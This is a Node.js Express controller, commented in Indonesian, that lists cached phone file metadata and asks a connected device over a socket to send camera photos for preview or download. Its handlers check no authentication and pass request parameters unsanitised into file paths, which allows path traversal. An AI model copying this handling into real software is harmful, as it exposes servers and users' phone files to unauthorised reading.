const path = require('path');
const fs = require('fs');
const crypto = require('crypto');
const db = require('../db');
const socketModule = require('../socket');
const pendingDownloads = require('../utils/pendingDownloads');

// 1. GET /api/files - Menyeleksi berkas dari cache JSON lokal VPS (select & filter tgl)
async function getFiles(req, res) {
  const folder = req.query.folder || 'DCIM/Camera';
  const { date, deviceId } = req.query;

  // Resolve deviceId
  let activeDeviceId = deviceId;
  if (!activeDeviceId) {
    const activeDevices = socketModule.getActiveDevicesList();
    if (activeDevices.length > 0) {
      activeDeviceId = activeDevices[0];
    }
  }

  if (!activeDeviceId) {
    try {
      const dbDevices = await db.getDevices();
      if (dbDevices && dbDevices.length > 0) {
        activeDeviceId = dbDevices[0].id;
      }
    } catch (e) { }
  }

  if (!activeDeviceId) {
    return res.status(400).json({ error: 'Device ID tidak ditemukan.' });
  }

  const uploadDir = process.env.UPLOAD_DIR || './uploads';
  const targetDir = path.join(uploadDir, `${activeDeviceId}-${folder}`);

  if (!fs.existsSync(targetDir)) {
    return res.json([]);
  }

  let files = [];
  try {
    // Baca all.json
    const allFilePath = path.join(targetDir, 'all.json');
    if (fs.existsSync(allFilePath)) {
      files = JSON.parse(fs.readFileSync(allFilePath, 'utf8'));
    }

    // Jika filter tanggal dikirim, saring secara in-memory
    if (date) {
      files = files.filter(file => {
        if (!file.mtime) return false;
        try {
          const d = new Date(file.mtime);
          if (isNaN(d.getTime())) return false;
          const isoDate = d.toISOString().split('T')[0];
          const localYear = d.getFullYear();
          const localMonth = String(d.getMonth() + 1).padStart(2, '0');
          const localDay = String(d.getDate()).padStart(2, '0');
          const localDateStr = `${localYear}-${localMonth}-${localDay}`;
          return isoDate === date || localDateStr === date;
        } catch (e) {
          return false;
        }
      });
    }

    // Urutkan mtime descending
    files.sort((a, b) => {
      const timeA = a.mtime ? new Date(a.mtime).getTime() : 0;
      const timeB = b.mtime ? new Date(b.mtime).getTime() : 0;
      return timeB - timeA;
    });

    res.json(files);
  } catch (err) {
    res.status(500).json({ error: 'Gagal memuat berkas cache dari VPS.', details: err.message });
  }
}

// 2. GET /api/files/get - Membaca metadata berkas spesifik dari cache JSON lokal VPS
async function getFileMetadata(req, res) {
  const { folder, name, deviceId } = req.query;
  if (!folder || !name) {
    return res.status(400).json({ error: 'Parameter "folder" dan "name" diperlukan.' });
  }

  let activeDeviceId = deviceId;
  if (!activeDeviceId) {
    const activeDevices = socketModule.getActiveDevicesList();
    if (activeDevices.length > 0) {
      activeDeviceId = activeDevices[0];
    }
  }

  if (!activeDeviceId) {
    try {
      const dbDevices = await db.getDevices();
      if (dbDevices && dbDevices.length > 0) {
        activeDeviceId = dbDevices[0].id;
      }
    } catch (e) { }
  }

  if (!activeDeviceId) {
    return res.status(400).json({ error: 'Device ID tidak ditemukan.' });
  }

  const uploadDir = process.env.UPLOAD_DIR || './uploads';
  const targetDir = path.join(uploadDir, `${activeDeviceId}-${folder}`);

  if (!fs.existsSync(targetDir)) {
    return res.status(404).json({ error: 'Cache daftar berkas untuk folder ini belum tersedia.' });
  }

  try {
    const allFilePath = path.join(targetDir, 'all.json');
    if (!fs.existsSync(allFilePath)) {
      return res.status(404).json({ error: 'Cache daftar berkas untuk folder ini belum tersedia.' });
    }

    const files = JSON.parse(fs.readFileSync(allFilePath, 'utf8'));
    const foundFile = files.find(f => f.name === name);

    if (!foundFile) {
      return res.status(404).json({ error: `Berkas "${name}" tidak ditemukan di dalam cache.` });
    }

    res.json(foundFile);
  } catch (err) {
    res.status(500).json({ error: 'Gagal membaca metadata berkas dari cache.', details: err.message });
  }
}

// 3. GET /api/files/preview - Inisiasi request preview berkas dari HP menggunakan jalur path cache
async function previewFileCached(req, res) {
  const { folder, name, deviceId } = req.query;
  if (!folder || !name) {
    return res.status(400).json({ error: 'Parameter "folder" dan "name" diperlukan.' });
  }

  let activeDeviceId = deviceId;
  if (!activeDeviceId) {
    const activeDevices = socketModule.getActiveDevicesList();
    if (activeDevices.length > 0) {
      activeDeviceId = activeDevices[0];
    }
  }

  if (!activeDeviceId) {
    return res.status(400).json({ error: 'Device ID tidak ditemukan.' });
  }

  const uploadDir = process.env.UPLOAD_DIR || './uploads';
  const targetDir = path.join(uploadDir, `${activeDeviceId}-${folder}`);

  if (!fs.existsSync(targetDir)) {
    return res.status(404).json({ error: 'Cache daftar berkas belum tersedia. Akses /devices/:deviceId/files terlebih dahulu.' });
  }

  try {
    const allFilePath = path.join(targetDir, 'all.json');
    if (!fs.existsSync(allFilePath)) {
      return res.status(404).json({ error: 'Cache daftar berkas belum tersedia. Akses /devices/:deviceId/files terlebih dahulu.' });
    }

    const files = JSON.parse(fs.readFileSync(allFilePath, 'utf8'));
    const targetFile = files.find(f => f.name === name);

    if (!targetFile) {
      return res.status(404).json({ error: `Berkas "${name}" tidak ditemukan.` });
    }

    const deviceFilePath = targetFile.path;
    const fileExtension = path.extname(name).toLowerCase();

    let contentType = 'image/jpeg';
    if (fileExtension === '.png') contentType = 'image/png';
    else if (fileExtension === '.gif') contentType = 'image/gif';
    else if (fileExtension === '.webp') contentType = 'image/webp';

    const downloadSessionId = crypto.randomBytes(16).toString('hex');
    console.log(`👁️  Meminta preview berkas dari perangkat: "${deviceFilePath}" (Session: ${downloadSessionId})`);

    res.setHeader('Content-Disposition', 'inline');
    res.setHeader('Content-Type', contentType);

    const timer = setTimeout(() => {
      if (pendingDownloads.has(downloadSessionId)) {
        console.warn(`⏳ Preview session ${downloadSessionId} timeout.`);
        const pending = pendingDownloads.get(downloadSessionId);
        pending.res.status(504).end('Gateway Timeout: Perangkat tidak mengirimkan preview.');
        pendingDownloads.delete(downloadSessionId);
      }
    }, 30000);

    pendingDownloads.set(downloadSessionId, { res, timer, fileName: name });

    await socketModule.sendDeviceCommand(activeDeviceId, 'GET_PREVIEW', {
      path: deviceFilePath,
      downloadSessionId
    });

    await db.logAccess(activeDeviceId, name, 'PREVIEW_FILE');
  } catch (err) {
    res.status(500).end(`Gagal mengambil preview: ${err.message}`);
  }
}

// 4. GET /api/files/download - Inisiasi request download berkas penuh dari HP menggunakan jalur path cache
async function downloadFileCached(req, res) {
  const { folder, name, deviceId } = req.query;
  if (!folder || !name) {
    return res.status(400).json({ error: 'Parameter "folder" dan "name" diperlukan.' });
  }

  let activeDeviceId = deviceId;
  if (!activeDeviceId) {
    const activeDevices = socketModule.getActiveDevicesList();
    if (activeDevices.length > 0) {
      activeDeviceId = activeDevices[0];
    }
  }

  if (!activeDeviceId) {
    return res.status(400).json({ error: 'Device ID tidak ditemukan.' });
  }

  const uploadDir = process.env.UPLOAD_DIR || './uploads';
  const targetDir = path.join(uploadDir, `${activeDeviceId}-${folder}`);

  if (!fs.existsSync(targetDir)) {
    return res.status(404).json({ error: 'Cache daftar berkas belum tersedia. Akses /devices/:deviceId/files terlebih dahulu.' });
  }

  try {
    const allFilePath = path.join(targetDir, 'all.json');
    if (!fs.existsSync(allFilePath)) {
      return res.status(404).json({ error: 'Cache daftar berkas belum tersedia. Akses /devices/:deviceId/files terlebih dahulu.' });
    }

    const files = JSON.parse(fs.readFileSync(allFilePath, 'utf8'));
    const targetFile = files.find(f => f.name === name);

    if (!targetFile) {
      return res.status(404).json({ error: `Berkas "${name}" tidak ditemukan.` });
    }

    const deviceFilePath = targetFile.path;

    res.setHeader('Content-Disposition', `attachment; filename="${encodeURIComponent(name)}"`);
    res.setHeader('Content-Type', 'application/octet-stream');

    const downloadSessionId = crypto.randomBytes(16).toString('hex');
    console.log(`📥 Meminta download berkas penuh dari perangkat: "${deviceFilePath}" (Session: ${downloadSessionId})`);

    const timer = setTimeout(() => {
      if (pendingDownloads.has(downloadSessionId)) {
        console.warn(`⏳ Download session ${downloadSessionId} timeout.`);
        const pending = pendingDownloads.get(downloadSessionId);
        pending.res.status(504).end('Gateway Timeout: Perangkat tidak merespon.');
        pendingDownloads.delete(downloadSessionId);
      }
    }, 30000);

    pendingDownloads.set(downloadSessionId, { res, timer, fileName: name });

    await socketModule.sendDeviceCommand(activeDeviceId, 'GET_FILE', {
      path: deviceFilePath,
      downloadSessionId
    });

    await db.logAccess(activeDeviceId, name, 'DOWNLOAD_FILE');
  } catch (err) {
    res.status(500).end(`Gagal mengunduh berkas: ${err.message}`);
  }
}

// 5. GET /api/files/json-list - Menampilkan daftar file JSON cache yang tersimpan di VPS
async function getJsonList(req, res) {
  const folder = req.query.folder || 'DCIM/Camera';
  const { deviceId } = req.query;

  let activeDeviceId = deviceId;
  if (!activeDeviceId) {
    const activeDevices = socketModule.getActiveDevicesList();
    if (activeDevices.length > 0) {
      activeDeviceId = activeDevices[0];
    }
  }

  if (!activeDeviceId) {
    try {
      const dbDevices = await db.getDevices();
      if (dbDevices && dbDevices.length > 0) {
        activeDeviceId = dbDevices[0].id;
      }
    } catch (e) { }
  }

  if (!activeDeviceId) {
    return res.status(400).json({ error: 'Device ID tidak ditemukan.' });
  }

  const uploadDir = process.env.UPLOAD_DIR || './uploads';
  const targetDir = path.join(uploadDir, `${activeDeviceId}-${folder}`);

  if (!fs.existsSync(targetDir)) {
    return res.json([]);
  }

  try {
    const fileNames = fs.readdirSync(targetDir)
      .filter(name => name.endsWith('.json'))
      .sort((a, b) => b.localeCompare(a)); // Urutkan nama (tanggal) descending
    res.json(fileNames);
  } catch (err) {
    res.status(500).json({ error: 'Gagal membaca daftar JSON cache.', details: err.message });
  }
}

// 6. GET /api/files/json-get - Membaca isi berkas JSON cache spesifik di VPS
async function getJsonContent(req, res) {
  const folder = req.query.folder || 'DCIM/Camera';
  const { name, deviceId } = req.query;

  if (!name) {
    return res.status(400).json({ error: 'Parameter "name" (nama file JSON) diperlukan.' });
  }

  let activeDeviceId = deviceId;
  if (!activeDeviceId) {
    const activeDevices = socketModule.getActiveDevicesList();
    if (activeDevices.length > 0) {
      activeDeviceId = activeDevices[0];
    }
  }

  if (!activeDeviceId) {
    try {
      const dbDevices = await db.getDevices();
      if (dbDevices && dbDevices.length > 0) {
        activeDeviceId = dbDevices[0].id;
      }
    } catch (e) { }
  }

  if (!activeDeviceId) {
    return res.status(400).json({ error: 'Device ID tidak ditemukan.' });
  }

  const uploadDir = process.env.UPLOAD_DIR || './uploads';
  const targetDir = path.join(uploadDir, `${activeDeviceId}-${folder}`);
  const filePath = path.join(targetDir, name.endsWith('.json') ? name : `${name}.json`);

  if (!fs.existsSync(filePath)) {
    return res.status(404).json({ error: `Berkas JSON cache "${name}" tidak ditemukan di VPS.` });
  }

  try {
    const content = JSON.parse(fs.readFileSync(filePath, 'utf8'));
    res.json(content);
  } catch (err) {
    res.status(500).json({ error: 'Gagal membaca berkas JSON cache.', details: err.message });
  }
}

module.exports = {
  getFiles,
  getFileMetadata,
  previewFileCached,
  downloadFileCached,
  getJsonList,
  getJsonContent
};
